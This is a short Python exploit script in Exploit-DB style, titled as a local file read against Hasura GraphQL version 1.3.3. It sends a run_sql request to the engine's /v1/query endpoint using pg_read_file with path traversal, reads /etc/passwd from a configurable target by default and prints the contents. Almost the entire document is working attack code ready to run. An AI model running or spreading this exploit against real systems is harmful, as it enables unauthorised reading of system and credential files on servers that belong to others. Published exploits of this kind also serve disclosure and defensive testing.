# Exploit Title: Hasura GraphQL - Local File Read
# Software: Hasura GraphQL
# Software Link: https://github.com/hasura/graphql-engine
# Version: 1.3.3
# Author: Dolev Farhi
# Date: 4.19.2021
# Tested on: Ubuntu

import requests
import sys

HASURA_SCHEME = 'http'
HASURA_HOST = '192.168.1.1'
HASURA_PORT = 80
READ_FILE = '/etc/passwd'

def LFI(file):
    SQLI = "SELECT pg_read_file('../../../../../../../../../{}',0,1000);".format(file)
    data =  {"type":"bulk","args":[{"type":"run_sql","args":{"sql":SQLI,"cascade":False,"read_only":False}}]}
    endpoint = '{}://{}:{}/v1/query'.format(HASURA_SCHEME, HASURA_HOST, HASURA_PORT)
    r = requests.post(endpoint, json=data)
    return r.json()

res = LFI(READ_FILE)

try:
  print(res[0]['result'][1][0])
except:
  print(res)
